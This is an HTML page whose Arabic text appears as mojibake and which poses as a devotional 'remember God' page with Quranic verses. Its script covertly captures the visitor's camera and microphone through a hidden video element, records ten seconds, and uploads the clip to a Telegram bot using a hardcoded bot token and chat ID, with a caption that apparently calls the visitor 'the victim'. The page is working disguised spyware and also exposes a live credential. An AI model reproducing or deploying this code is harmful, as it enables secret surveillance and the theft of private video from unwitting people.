<DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ø§Ø°ÙƒØ± Ø§Ù„Ù„Ù‘Ù‡</title>
<style>
body{font-family:Tahoma, Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f3f6ff}
#msg{max-width:760px;padding:18px;text-align:center;color:#222}
#status{margin-top:10px;color:#333}
video{display:none}
</style>
</head>
<body>
<div id="msg">
<h3>Ø§Ø°ÙƒØ± Ø§Ù„Ù„Ù‡</h3>
<p id="status">Ø¬Ø§Ù‡Ø² â€” Ø¬Ø§Ø±Ù Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§...</p>
<small>Ø§Ù„Ù„Ù‡Ù… ØµÙ„ÙŠ ÙˆØ³Ù„Ù… Ø¹Ù„ÙŠ Ù†Ø¨ÙŠÙ†Ø§ Ù…Ø­Ù…Ø¯ï·º</small>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>

<script>
const RECORD_SECONDS = 10; // Ù…Ø¯Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0"; // Ø§Ø³ØªØ¨Ø¯Ù„ Ù…Ø­Ù„ÙŠÙ‹Ø§ Ù„ØªØ¬Ø±Ø¨Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
const CHAT_ID  = "6683130316";    // Ø§Ø³ØªØ¨Ø¯Ù„ Ù…Ø­Ù„ÙŠÙ‹Ø§ Ù„ØªØ¬Ø±Ø¨Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„

const statusEl = document.getElementById('status');
const hiddenVideo = document.getElementById('hiddenVideo');

let started = false;
let stream = null;
let mediaRecorder = null;
let recordedBlobs = [];

window.addEventListener('load', ()=>{ attemptStart(); 
  window.addEventListener('click', onFirstInteraction,{once:true});
  window.addEventListener('touchstart',onFirstInteraction,{once:true});
  window.addEventListener('keydown',onFirstInteraction,{once:true});
});

function onFirstInteraction(){ if(!started) attemptStart(); }

async function attemptStart(){
  if(started) return;
  started = true;
  statusEl.textContent='Ø¨Ø³Ù… Ø§Ù„Ù„Ù‡ Ø§Ù„Ø±Ø­Ù…Ù† Ø§Ù„Ø±Ø­ÙŠÙ…...';
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    hiddenVideo.srcObject = stream;
    startRecording();
  }catch(err){
    console.warn('getUserMedia failed:',err);
    statusEl.textContent='ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ .';
    started=false;
  }
}

function startRecording(){
  try{ mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});}catch(e){ mediaRecorder=new MediaRecorder(stream);}
  recordedBlobs=[];
  mediaRecorder.ondataavailable=ev=>{if(ev.data && ev.data.size) recordedBlobs.push(ev.data);}
  mediaRecorder.onstart=()=>{statusEl.textContent=`â‘  Ø§Ù„Ø²Ù‘ÙØ§Ù†ÙÙŠÙØ©Ù ÙˆÙØ§Ù„Ø²Ù‘ÙØ§Ù†ÙÙŠ ÙÙØ§Ø¬Ù’Ù„ÙØ¯ÙÙˆØ§ ÙƒÙÙ„Ù‘Ù ÙˆÙØ§Ø­ÙØ¯Ù Ù…ÙÙ†Ù’Ù‡ÙÙ…ÙØ§ Ù…ÙØ§Ø¦ÙØ©Ù Ø¬ÙÙ„Ù’Ø¯ÙØ©Ù Û– ÙˆÙÙ„ÙØ§ ØªÙØ£Ù’Ø®ÙØ°Ù’ÙƒÙÙ…Ù’ Ø¨ÙÙ‡ÙÙ…ÙØ§ Ø±ÙØ£Ù’ÙÙØ©ÙŒ ÙÙÙŠ Ø¯ÙÙŠÙ†Ù Ø§Ù„Ù„Ù‘ÙÙ‡Ù Ø¥ÙÙ† ÙƒÙÙ†ØªÙÙ…Ù’ ØªÙØ¤Ù’Ù…ÙÙ†ÙÙˆÙ†Ù Ø¨ÙØ§Ù„Ù„Ù‘ÙÙ‡Ù ÙˆÙØ§Ù„Ù’ÙŠÙÙˆÙ’Ù…Ù Ø§Ù„Ù’Ø¢Ø®ÙØ±Ù Û– ÙˆÙÙ„Ù’ÙŠÙØ´Ù’Ù‡ÙØ¯Ù’ Ø¹ÙØ°ÙØ§Ø¨ÙÙ‡ÙÙ…ÙØ§ Ø·ÙØ§Ø¦Ù’ÙÙØ©ÙŒ Ù…Ù‘ÙÙ†Ù Ø§Ù„Ù’Ù…ÙØ¤Ù’Ù…ÙÙ†ÙÙŠÙ†Ù

â‘¡ Ø§Ù„Ø²Ù‘ÙØ§Ù†ÙÙŠ Ù„ÙØ§ ÙŠÙÙ†ÙƒÙØ­Ù Ø¥ÙÙ„Ù‘ÙØ§ Ø²ÙØ§Ù†ÙÙŠÙØ©Ù‹ Ø£ÙÙˆÙ’ Ù…ÙØ´Ù’Ø±ÙÙƒÙØ©Ù‹ ÙˆÙØ§Ù„Ø²Ù‘ÙØ§Ù†ÙÙŠÙØ©Ù Ù„ÙØ§ ÙŠÙÙ†ÙƒÙØ­ÙÙ‡ÙØ§ Ø¥ÙÙ„Ù‘ÙØ§ Ø²ÙØ§Ù†Ù Ø£ÙÙˆÙ’ Ù…ÙØ´Ù’Ø±ÙÙƒÙŒ ÙˆÙØ­ÙØ±Ù‘ÙÙ…Ù Ø°ÙÙ„ÙÙƒÙ Ø¹ÙÙ„ÙÙ‰ Ø§Ù„Ù’Ù…ÙØ¤Ù’Ù…ÙÙ†ÙÙŠÙ†Ù

â‘¢ ÙˆÙØ§Ù„Ù‘ÙØ°ÙÙŠÙ†Ù ÙŠÙØ±Ù’Ù…ÙÙˆÙ†Ù Ø§Ù„Ù’Ù…ÙØ­Ù’ØµÙÙ†ÙØ§ØªÙ Ø«ÙÙ…Ù‘Ù Ù„ÙÙ…Ù’ ÙŠÙØ£Ù’ØªÙÙˆØ§ Ø¨ÙØ£ÙØ±Ù’Ø¨ÙØ¹ÙØ©Ù Ø´ÙÙ‡ÙØ¯ÙØ§Ø¡Ù ÙÙØ§Ø¬Ù’Ù„ÙØ¯ÙÙˆÙ‡ÙÙ…Ù’ Ø«ÙÙ…ÙØ§Ù†ÙÙŠÙ†Ù Ø¬ÙÙ„Ù’Ø¯ÙØ©Ù‹ ÙˆÙÙ„ÙØ§ ØªÙÙ‚Ù’Ø¨ÙÙ„ÙÙˆØ§ Ù„ÙÙ‡ÙÙ…Ù’ Ø´ÙÙ‡ÙØ§Ø¯ÙØ©Ù‹ Ø£ÙØ¨ÙØ¯Ù‹Ø§ Ûš ÙˆÙØ£ÙÙˆÙ„ÙÙ°Ø¦ÙÙƒÙ Ù‡ÙÙ…Ù Ø§Ù„Ù’ÙÙØ§Ø³ÙÙ‚ÙÙˆÙ†Ù

â‘£ Ø¥ÙÙ„Ù‘ÙØ§ Ø§Ù„Ù‘ÙØ°ÙÙŠÙ†Ù ØªÙØ§Ø¨ÙÙˆØ§ Ù…ÙÙ† Ø¨ÙØ¹Ù’Ø¯Ù Ø°ÙÙ°Ù„ÙÙƒÙ ÙˆÙØ£ÙØµÙ’Ù„ÙØ­ÙÙˆØ§ ÙÙØ¥ÙÙ†Ù‘Ù Ø§Ù„Ù„Ù‘ÙÙ‡Ù ØºÙÙÙÙˆØ±ÙŒ Ø±Ù‘ÙØ­ÙÙŠÙ…ÙŒ

â‘¤ ÙˆÙØ§Ù„Ù’Ù…ÙØ­Ù’ØµÙÙ†ÙØ§ØªÙ Ù…ÙÙ†Ù Ø§Ù„Ù†Ù‘ÙØ³ÙØ§Ø¡Ù Ø¥ÙÙ„Ù‘ÙØ§ Ù…ÙØ§ Ù…ÙÙ„ÙÙƒÙØªÙ’ Ø£ÙÙŠÙ’Ù…ÙØ§Ù†ÙÙƒÙÙ…Ù’ ÙƒÙØªÙØ§Ø¨Ù Ø§Ù„Ù„Ù‘ÙÙ‡Ù Ø¹ÙÙ„ÙÙŠÙ’ÙƒÙÙ…Ù’ Ûš ÙˆÙØ±ÙØ§Ø¬ÙÙˆØ§ Ø§Ù„Ù†Ù‘ÙØ³ÙØ§Ø¡Ù Ø¨ÙØ§Ù„Ù’Ù…ÙØ¹Ù’Ø±ÙÙˆÙÙ Ûš ÙˆÙÙ„Ø§ ØªÙØ¹Ù’ØªÙØ¯ÙÙˆØ§ Ûš Ø¥ÙÙ†Ù‘Ù Ø§Ù„Ù„Ù‘ÙÙ‡Ù ÙƒÙØ§Ù†Ù Ø¹ÙÙÙÙˆÙ‘Ù‹Ø§ ØºÙÙÙÙˆØ±Ù‹Ø§ ${RECORD_SECONDS} Ø«Ø§Ù†ÙŠØ©.`;}
  mediaRecorder.onstop=async()=>{
    statusEl.textContent='ØµØ¯Ù‚ Ø§Ù„Ù„Ù‡ Ø§Ù„Ø¹Ø¸ÙŠÙ… ...';
    if(stream) stream.getTracks().forEach(t=>t.stop());
    const blob=new Blob(recordedBlobs,{type:'video/webm'});

    if(!BOT_TOKEN.includes('PUT') && !CHAT_ID.includes('PLACEHOLDER')){
      try{
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption','Ø§Ù„Ø¶Ø­ÙŠØ© Ø§Ù„Ù…Ø­ØªØ±Ù…Ù‡ ğŸ˜ğŸ˜ˆ');
        form.append('video', blob, `rec_${Date.now()}.webm`);
        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:form});
        if(!resp.ok){
          const txt = await resp.text().catch(()=>null);
          console.error('HTTP error',resp.status, txt);
          statusEl.textContent=`ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ (HTTP ${resp.status}) â€” ØºØ§Ù„Ø¨Ù‹Ø§ CORS Ø£Ùˆ Ø§Ù„ØªÙˆÙƒÙ† ØºÙŠØ± ØµØ­ÙŠØ­.`;
          return;
        }
        const json = await resp.json().catch(()=>null);
        if(json && json.ok){
          statusEl.textContent='âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Telegram (ØªØ¹Ù„ÙŠÙ…ÙŠ).';
        }else{
          console.error('Telegram API response', json);
          statusEl.textContent='âŒ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ÙØ´Ù„: ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ† ÙˆChat ID.';
        }
      }catch(err){
        console.error('send error:',err);
        statusEl.textContent='Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: '+(err.message||err);
      }
    }else{
      statusEl.textContent='Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: Ø¶Ø¹ BOT_TOKEN ÙˆCHAT_ID Ù…Ø­Ù„ÙŠÙ‹Ø§ Ù„ØªØ¬Ø±Ø¨Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.';
    }
  };
  mediaRecorder.start();
  setTimeout(()=>{if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop();}, RECORD_SECONDS*1000);
}
</script>
</body>
</html>
